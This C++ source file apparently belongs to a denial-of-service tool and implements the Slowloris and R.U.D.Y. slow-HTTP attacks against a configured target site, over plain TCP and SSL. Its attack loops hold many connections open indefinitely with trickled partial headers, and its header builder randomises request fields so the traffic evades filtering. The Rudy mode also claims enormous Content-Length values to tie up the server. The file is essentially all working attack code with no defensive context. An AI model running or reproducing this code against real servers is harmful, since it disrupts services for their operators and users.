#include <netdb.h>
#include <cstring>
#include <openssl/ssl.h>

#include "../Headers/Slowloris.hpp"

void Slowloris::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        keep_alive.push_back(false);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                keep_alive[x] = false;
            }
            std::string header{};
            init_header(header, keep_alive[x]);
            if((r = write_socket(sockets[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

void Slowloris::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
        keep_alive.push_back(false);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }
            std::string header{};
            init_header(header, keep_alive[x]);
            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

Slowloris::Slowloris(std::shared_ptr<Config> conf) : Http_Flood(conf) {

}

void Slowloris::init_header(std::string& header, bool keep_alive) {
    switch (conf->vector){
        case Config::Slowloris:{
            if(keep_alive){
                header += "X-a: "
                          + std::to_string(Randomizer::randomInt(1, 5000))
                          + " \r\n";
            }else{
                header += Randomizer::random_method() + " /";
                if(conf->RandomizeHeader){
                    header += Randomizer::randomstr();
                }
                header += " HTTP/1.0\r\nUser-Agent: "
                          + Randomizer::random_useragent(*(conf->useragents))
                          + " \r\nCache-Control: " + Randomizer::random_caching()
                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
                          + " \r\nReferer: " + Randomizer::random_referer()
                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
                          + " \r\nAccept: */*"
                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
                          + " \r\n";
            }
            break;
        }
        case Config::Rudy:{
            if(keep_alive){
                header += Randomizer::randomstr();
            }else{
                header += "POST /";
                if(conf->RandomizeHeader){
                    header += Randomizer::randomstr();
                }
                header += " HTTP/1.0\r\nUser-Agent: "
                          + Randomizer::random_useragent(*(conf->useragents))
                          + " \r\nCache-Control: " + Randomizer::random_caching()
                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
                          + " \r\nReferer: " + Randomizer::random_referer()
                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
                          + " \r\nContent-Length: " + std::to_string(Randomizer::randomInt(100000000, 1000000000))
                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
                          + " \r\nAccept: */*"
                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
                          + " \r\n";
            }
            break;
        }
        default:break;
    }
}

